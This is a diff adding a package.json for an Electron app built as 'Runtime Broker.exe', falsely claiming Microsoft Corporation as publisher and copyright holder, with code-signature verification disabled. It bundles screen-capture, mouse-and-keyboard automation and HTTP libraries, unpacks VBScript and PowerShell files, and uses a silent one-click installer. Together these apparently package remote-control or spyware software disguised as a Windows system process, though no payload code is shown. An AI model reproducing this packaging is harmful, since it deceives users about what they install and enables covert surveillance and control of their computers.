@@ -1,0 +1,59 @@
+{
+  "name": "system-service-host",
+  "version": "1.0.0",
+  "description": "System service host application",
+  "main": "main.js",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder --win --x64",
+    "package": "electron-packager . \"RuntimeBroker\" --platform=win32 --arch=x64 --out=dist --overwrite --asar --ignore=\"^/dist\" --icon=icon_2.ico",
+    "create-installer": "node build-installer.js",
+    "package-and-install": "npm run package && npm run create-installer",
+    "build_final_v9": "npm run build"
+  },
+  "build": {
+    "appId": "com.microsoft.runtimebroker",
+    "productName": "RuntimeBroker",
+    "artifactName": "Runtime Broker.exe",
+    "copyright": "© Microsoft Corporation. All rights reserved.",
+    "directories": {
+      "output": "dist"
+    },
+    "win": {
+      "icon": "icon_2.ico",
+      "target": "nsis",
+      "verifyUpdateCodeSignature": false,
+      "publisherName": "Microsoft Corporation",
+      "requestedExecutionLevel": "asInvoker"
+    },
+    "asarUnpack": [
+      "*.vbs",
+      "*.ps1",
+      "*.ico",
+      "node_modules/@nut-tree-fork/**",
+      "node_modules/screenshot-desktop/**"
+    ],
+    "nsis": {
+      "oneClick": true,
+      "perMachine": false,
+      "allowToChangeInstallationDirectory": false,
+      "createDesktopShortcut": true,
+      "createStartMenuShortcut": true
+    }
+  },
+  "dependencies": {
+    "@nut-tree-fork/nut-js": "^4.2.6",
+    "axios": "^1.6.0",
+    "screenshot-desktop": "^1.5.3"
+  },
+  "devDependencies": {
+    "electron": "^40.8.0",
+    "electron-builder": "^22.14.13",
+    "electron-installer-windows": "^1.1.0",
+    "electron-packager": "^15.4.0",
+    "png-to-ico": "^3.0.1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "MIT"
+}
